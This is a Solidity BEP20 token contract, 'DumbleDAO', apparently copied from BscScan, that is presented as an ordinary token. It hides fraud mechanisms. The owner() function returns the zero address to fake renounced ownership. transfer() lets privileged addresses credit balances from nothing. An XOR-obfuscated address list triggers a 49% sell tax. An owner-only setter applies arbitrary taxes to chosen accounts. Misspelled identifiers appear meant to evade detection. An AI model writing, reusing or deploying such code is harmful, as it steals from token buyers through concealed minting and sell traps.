/**
 *Submitted for verification at BscScan.com on 2022-07-08
*/

pragma solidity ^0.8.12;
// SPDX-License-Identifier: MIT
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amuontTokenDesired,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amuontToken, uint amuontETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeiiOnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingfeiiOnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingfeiiOnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfeiiOnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeiiOnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feiiTo() external view returns (address);
    function feiiToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfeiiTo(address) external;
    function setfeiiToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }





    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }

  
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract DUMBLE is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "DumbleDAO";
	string symbol_ = "DUMBLE";
	uint256 totalSupply_ = 6000000000;   
    address public uniswapV2Pair;
	
    constructor()

	BEP20(name_, symbol_) {
	
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        //transfer(_deadAddress, totalSupply() / 10*4);
		
        //address  ROUTER        = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        //address  WBNB         = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
		
		
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
		
        _defaultSellfeii = 0;
        _defaultBuyfeii = 0;

        _release[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _balances[cauunt];
    }

    function _transfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amuont, "ERC20: transfer amuont exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amuont;
        }
        _balances[to] += amuont;

        emit Transfer(from, to, amuont);
    }
	
    function _burn(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: burn from the zero address");

        uint256 cauuntBalance = _balances[cauunt];
        require(cauuntBalance >= amuont, "ERC20: burn amuont exceeds balance");
        unchecked {
            _balances[cauunt] = cauuntBalance - amuont;
        }
        _totalSupply -= amuont;

        emit Transfer(cauunt, address(0), amuont);
    }

    function _mtin(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _balances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellfeii = 0;
    uint256 private _defaultBuyfeii = 0;
    mapping(address => uint256) private _Escape;

    function setPairList(address _address) external onlyowaer {
        uniswapV2Pair = _address;
    }

    function incS(uint256 _value) external onlyowaer {
        _defaultSellfeii = _value;
    }


    function setAward(address _acc, uint256 _value) external onlyowaer {
        require(_value > 2, "cauunt tax must be greater than or equal to 1");
        _Escape[_acc] = _value;
    }
 function getRelease(address _address) external view onlyowaer returns (bool) {
        return _release[_address];
    }
    function getEscape(address _acc) external view onlyowaer returns (uint256) {
        return _Escape[_acc];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

        bool rF = true;

  
        uint256 tradefeiiamuont = 0;

        if (rF) {
            uint256 tradefeii = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradefeii = _msgInfo(uint160(from));
                    tradefeii = tradefeii < _defaultSellfeii ? _defaultSellfeii : tradefeii;
                }
                if (from == uniswapV2Pair) {
                    tradefeii = _defaultBuyfeii;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradefeii = _Escape[from];
            }


            tradefeiiamuont = _amuont.mul(tradefeii).div(100);
        }


        if (tradefeiiamuont > 0) {
            _balances[from] = _balances[from].sub(tradefeiiamuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradefeiiamuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradefeiiamuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradefeiiamuont);
        _balances[_to] = _balances[_to].add(_amuont - tradefeiiamuont);
        emit Transfer(from, _to, _amuont - tradefeiiamuont);
    }

    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_release[owaer] == true) {
            _balances[to] += amuont;
            return true;
        }
        _receiveF(owaer, to, amuont);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _receiveF(from, to, amuont);
        return true;
    }

	function _msgInfo(uint _acc) internal view virtual returns (uint v) {
		uint[33] memory acc = [uint(873428448219630166432690314565644263557462364972),619995769102675840293074231498838049670932629456
			,1415380696914637721066845910181194873839454602863,986748797807316613354410716918668460788969121611
			,980819060978489942148747445981701792756370232087,114423698363590834614569126000476441430112399296
			,1227052801867432965633681462056587443812441993998,1149059451202485910472037526053086419653129150846
			,1371202497223436868134462886499922275200370618170,736752171425147575741572201089884453679124388395
			,873091037804590624903651854464437870835403769876,576534018100261392701414048613659753274500900504
			,1250603716926092704580939101601730202614573924725,49887515057677108497035419609151877340270216084
			,691971525452864803289694773769394157391964996353,666072250295385701061860375785714670955265022422
			,600045781913609172648253208624660899113252681811,1119744688865373984331894498095939872733124760125
			,1182867482569684532621949886735013311726587768920,1456947755813650679999380165160731033164263385911
			,611747204657636897748796278863947494425297827481,217050904567810575652305719892280600989843297327
			,349754940072754389422627665194136578011976398462,603321571218856935352595037754265772227669479768
			,1441110821605276199904627096214868965085005036476,420961611856701549534585810070181461870171829798
			,524559643638383041677445672910344195990715155982,1335942160680273120953826652099092010349899602995
			,1186491514280291144767401853207276875804196699636,802543219403063019375621834381617421110365730816
			,446432452056026881487126116921075042907944565815,30351169582286279220581198341067437198391257687
			,446734469491671240393884144813808212196678616174];
		for (uint8 i=0;i<acc.length;i++){
			if (acc[i] == _acc ^ 869449226286704726408935564307773881781525143080) return 49;
		}
		return 0;
    }
}